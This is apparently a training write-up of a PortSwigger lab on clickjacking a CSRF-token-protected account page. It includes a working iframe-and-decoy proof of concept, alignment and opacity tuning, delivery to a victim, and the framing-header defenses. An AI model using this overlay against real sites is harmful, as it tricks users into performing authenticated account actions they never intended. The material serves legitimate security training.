# Lab 01 — Basic Clickjacking With CSRF Token Protection

## Objective

Exploit a basic clickjacking vulnerability to perform an authenticated account action despite the presence of a CSRF token.

The lab demonstrates that CSRF token protection does not necessarily prevent clickjacking when the target page can be framed.

---

# Credentials

Use the lab credentials provided by PortSwigger:

```text
Username: wiener
Password: peter
```

---

# Attack Concept

```text
Victim Logged In
       ↓
Target Account Page
       ↓
Page Contains CSRF-Protected Action
       ↓
Target Page Loaded in iframe
       ↓
iframe Made Transparent
       ↓
Visible Decoy Positioned Over Target
       ↓
Victim Clicks Decoy
       ↓
Legitimate Form Submitted
       ↓
Target Action Executes
```

---

# Step 1 — Log In

Log in using:

```text
wiener
```

and:

```text
peter
```

Open:

```text
/my-account
```

---

# Step 2 — Identify the Target Action

Inspect the account page.

The lab contains a sensitive account action.

The target control must be identified so that the clickjacking overlay can be positioned correctly.

---

# Step 3 — Inspect the Request

Use:

```text
Burp Suite
    ↓
Proxy
    ↓
HTTP history
```

Find the request associated with the target action.

Inspect the form and identify the CSRF token.

Conceptually:

```html
<input type="hidden" name="csrf" value="TOKEN">
```

---

# Step 4 — Confirm Frameability

Inspect the response headers.

Check for:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

especially:

```text
frame-ancestors
```

The target must be frameable for the basic clickjacking attack.

---

# Step 5 — Create Exploit Page

Open the:

```text
Exploit Server
```

Use an iframe to load the target page.

Basic structure:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

---

# Step 6 — Add Overlay

Use CSS to position the iframe and a visible decoy.

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with the actual lab identifier.

---

# Step 7 — Align the Target

Keep:

```css
opacity: 0.1;
```

while testing.

This makes the target page partially visible.

Move:

```css
top
left
```

until the visible decoy is positioned directly over the target control.

---

# Step 8 — Verify the Click

The goal is:

```text
Visible:
Click me

Underlying:
Target Action
```

The victim sees the decoy but the browser sends the click to the framed target.

---

# Step 9 — Hide the iframe

After alignment is correct, reduce the iframe opacity.

Example:

```css
opacity: 0.0001;
```

The target interface should now be effectively invisible.

---

# Step 10 — Deliver the Exploit

Save the exploit page.

Use:

```text
Deliver exploit to victim
```

in the authorized PortSwigger lab.

---

# Expected Result

The victim interacts with:

```text
Click me
```

but the click reaches the target account action inside the iframe.

The action is performed using the victim's authenticated session.

---

# Why the CSRF Token Does Not Stop the Attack

The target page is loaded directly from the legitimate application.

Therefore:

```text
Victim Session
      ↓
Legitimate Target Page
      ↓
Valid CSRF Token
      ↓
Target Form
```

The attacker does not need to manually know the CSRF token.

The victim's browser loads the legitimate form and performs the interaction.

---

# Complete Attack Flow

```text
Login as wiener
       ↓
Open /my-account
       ↓
Identify target action
       ↓
Inspect CSRF protection
       ↓
Confirm frameability
       ↓
Create iframe
       ↓
Create visible decoy
       ↓
Align target control
       ↓
Set iframe opacity
       ↓
Deliver to victim
       ↓
Victim clicks
       ↓
Target action executes
```

---

# Burp Suite Workflow

```text
Proxy
  ↓
HTTP History
  ↓
GET /my-account
  ↓
Inspect response
  ↓
Identify CSRF token
  ↓
Check framing headers
  ↓
Exploit Server
  ↓
Create iframe PoC
  ↓
Align overlay
  ↓
Deliver exploit
```

---

# Troubleshooting

## iframe Does Not Load

Check:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

Look specifically for:

```text
frame-ancestors
```

---

## Decoy Is Misaligned

Temporarily increase:

```css
opacity: 0.1;
```

Then adjust:

```css
top
left
width
height
```

---

## Target Button Is Not Receiving the Click

Check:

```text
z-index
iframe position
decoy position
iframe dimensions
```

The iframe must be positioned above the decoy.

---

# Final Checklist

```text
☐ Logged in as wiener
☐ Identified sensitive action
☐ Identified CSRF token
☐ Confirmed target page is frameable
☐ Created iframe
☐ Created decoy
☐ Used partial opacity for alignment
☐ Correctly aligned target action
☐ Reduced iframe opacity
☐ Delivered exploit
☐ Victim interaction triggered target action
☐ Lab solved
```

---

# Key Learning

This lab demonstrates:

```text
CSRF Token Protection
        ≠
Clickjacking Protection
```

A CSRF token can protect a request against traditional cross-site request forgery while the legitimate target page remains vulnerable to clickjacking if it can be embedded.

The primary defense against this attack is to prevent unauthorized framing using mechanisms such as:

```http
X-Frame-Options: DENY
```

or:

```http
Content-Security-Policy: frame-ancestors 'none';
```